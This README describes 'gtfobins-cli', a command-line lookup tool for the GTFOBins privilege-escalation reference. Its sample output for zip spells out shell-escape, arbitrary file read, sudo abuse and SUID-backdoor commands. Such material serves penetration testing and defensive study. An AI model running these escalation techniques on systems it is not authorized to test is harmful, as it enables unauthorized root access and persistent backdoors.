# GTFOBins-CLI

`gtfobins-cli` is a command line interface for https://gtfobins.github.io.

This tool is perfect for those who work most of the time with a terminal and need to check if there is a way to escalate privilege using a certain command. Instead of opening the browser, going to https://gtfobins.github.io and looking for the command, `gtfobins-cli` does the same but from the terminal.

## Running `gtfobins-cli`

```console
$ git clone https://github.com/7Rocky/gtfobins-cli
$ cd gtfobins-cli/
$ chmod +x gtfobins-cli.py
```

Now, you can use either `python3 gtfobins-cli.py` or `./gtfobins-cli.py` to execute the tool.

Additionally, you can rename the script to simply `gtfobins-cli` and move it to a directory in your `PATH` environment variable (i.e `/usr/local/bin`), so that `gtfobins-cli` is available as a command at every working directory. Alternatively, you can create a symbolic link inside a directory in the `PATH` to the actual script. 

## Usage of `gtfobins-cli`

As easy as using https://gtfobins.github.io:

```console
$ gtfobins-cli [options] <command>
```

For example, you can read all information about a command:

```console
$ gtfobins-cli.py zip              

zip ==> https://gtfobins.github.io/gtfobins/zip/


Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

TF=$(mktemp -u)
zip $TF /etc/hosts -T -TT 'sh #'
rm $TF


File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

LFILE=file-to-read
TF=$(mktemp -u)
zip $TF $LFILE
unzip -p $TF


Sudo

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF


Limited SUID

If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

sudo install -m =xs $(which zip) .

TF=$(mktemp -u)
./zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF 
```

Or you can try to be more specific:

```console
$ gtfobins-cli --shell zip

zip ==> https://gtfobins.github.io/gtfobins/zip/


Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

TF=$(mktemp -u)
zip $TF /etc/hosts -T -TT 'sh #'
rm $TF
```

```console
$ gtfobins-cli --shell --sudo zip

zip ==> https://gtfobins.github.io/gtfobins/zip/


Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

TF=$(mktemp -u)
zip $TF /etc/hosts -T -TT 'sh #'
rm $TF


Sudo

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

## Using `gtfobins-cli` with Docker

There is an image in Docker Hub called `7rocky/gtfobins-cli` to execute `gtfobins-cli` from a Docker container:

```console
$ docker run --rm -it 7rocky/gtfobins-cli [options] <command>
```

If you want to build and run the image locally:

```console
$ cd gtfobins-cli/
$ docker build -t gtfobins-cli .
$ docker run --rm -it gtfobins-cli [options] <command>
```

Hope it is useful! :smile:
